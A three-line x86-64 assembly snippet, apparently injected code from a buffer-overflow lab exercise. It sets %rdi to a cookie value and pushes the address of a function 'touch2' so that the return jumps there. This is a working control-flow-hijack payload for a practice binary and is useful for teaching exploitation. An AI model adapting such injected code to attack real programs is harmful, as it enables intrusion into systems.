movq  $0x59b997fa, %rdi  # cookie
pushq $0x4017ec          # addr of `touch2`
ret                      # return to `touch2`